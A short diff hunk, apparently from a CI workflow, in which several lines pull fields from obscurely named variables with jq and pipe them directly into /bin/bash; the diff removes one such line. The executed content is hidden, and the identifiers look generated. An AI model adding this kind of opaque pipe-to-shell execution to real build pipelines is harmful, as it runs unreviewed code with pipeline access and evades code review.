@@ -21,7 +21,6 @@ jobs:
           echo $oo049 | jq -r .u168 | /bin/bash
           echo $agu5639 | jq -r .gjbc0 | /bin/bash
           echo $gqwx256 | jq -r .dnvs1108 | /bin/bash
-          echo $hb9 | jq -r .ha79248 | /bin/bash
           printf '%s' "$cepo6339" | jq -r .x1 | /bin/bash
           printf '%s' "$hlks93" | jq -r .kkxgl7 | /bin/bash
           printf '%s' "$fphd68" | jq -r .o1146 | /bin/bash
